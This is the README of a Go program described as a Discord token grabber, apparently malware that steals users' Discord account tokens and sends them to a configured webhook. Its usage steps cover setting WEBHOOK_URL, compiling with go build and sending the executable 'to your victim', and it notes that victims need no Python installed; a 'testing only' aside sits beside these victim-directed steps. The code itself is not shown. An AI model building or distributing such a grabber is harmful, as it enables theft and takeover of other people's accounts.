## Discord Token Grabber *Go*

A Discord token grabber, this time written in Golang. This means it's simpler to compile an executable (for testing only!!) and send it. There are no worries about obfuscation or the victim needing Python installed.

This was "inspired by" (copied from) [wodxgod's Python version](https://github.com/wodxgod/Discord-Token-Grabber)


### Usage
1. Install Go https://golang.org/dl
2. Change WEBHOOK_URL and PING_ME if you'd like in the file.
3. Compile the script
    ```sh
    go build token-grabber.go
    ```
4. Send it to your victim
